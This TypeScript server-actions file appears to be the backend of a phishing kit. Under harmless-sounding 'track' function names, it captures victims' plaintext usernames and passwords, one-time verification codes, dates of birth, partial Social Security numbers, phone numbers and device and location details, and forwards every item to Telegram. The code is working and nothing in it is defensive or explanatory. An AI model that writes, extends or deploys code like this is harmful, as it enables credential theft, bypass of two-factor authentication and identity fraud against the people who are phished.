'use server'

import { 
  sendTelegramNotification, 
  formatVisitorNotification,
  formatLoginNotification,
  formatVerificationOptionNotification,
  formatVerificationCodeNotification,
  formatBackToSignInNotification,
  formatResendCodeNotification,
  formatChooseDifferentMethodNotification,
  formatIdentityDetailsNotification
} from './telegram'


export async function trackVisitor(visitorData: {
  location?: string
  ip?: string
  timezone?: string
  isp?: string
  device?: string
  screen?: string
  language?: string
  referrer?: string
  url?: string
  localTime?: string
  utcTime?: string
}) {
  try {
    const message = formatVisitorNotification(visitorData)
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error("Error tracking visitor:", error)
    return { success: false, count: 0, error: String(error) }
  }
}


export async function trackLogin(username: string, password: string) {
  try {
    const message = formatLoginNotification(username, password)
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error('Error tracking login:', error)
    return { success: false, count: 0, error: String(error) }
  }
}


export async function trackVerificationOption(type: 'SMS' | 'Call') {
  try {
    const message = formatVerificationOptionNotification(type)
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error('Error tracking verification option:', error)
    return { success: false, count: 0, error: String(error) }
  }
}


export async function trackVerificationCode(verificationType: string, code: string) {
  try {
    const message = formatVerificationCodeNotification(verificationType, code)
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error('Error tracking verification code:', error)
    return { success: false, count: 0, error: String(error) }
  }
}


export async function trackBackToSignIn() {
  try {
    const message = formatBackToSignInNotification()
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error('Error tracking back to sign in:', error)
    return { success: false, count: 0, error: String(error) }
  }
}


export async function trackResendCode(isSecondOtp?: boolean) {
  try {
    const message = formatResendCodeNotification(isSecondOtp)
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error('Error tracking resend code:', error)
    return { success: false, count: 0, error: String(error) }
  }
}


export async function trackIdentity(data: {
  dateOfBirth: string
  ssnLast4: string
  phoneNumber: string
  zipCode: string
}) {
  try {
    const message = formatIdentityDetailsNotification(data)
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error('Error tracking identity details:', error)
    return { success: false, count: 0, error: String(error) }
  }
}


export async function trackChooseDifferentMethod() {
  try {
    const message = formatChooseDifferentMethodNotification()
    const successCount = await sendTelegramNotification(message)
    return { success: successCount > 0, count: successCount }
  } catch (error) {
    console.error('Error tracking choose different method:', error)
    return { success: false, count: 0, error: String(error) }
  }
}
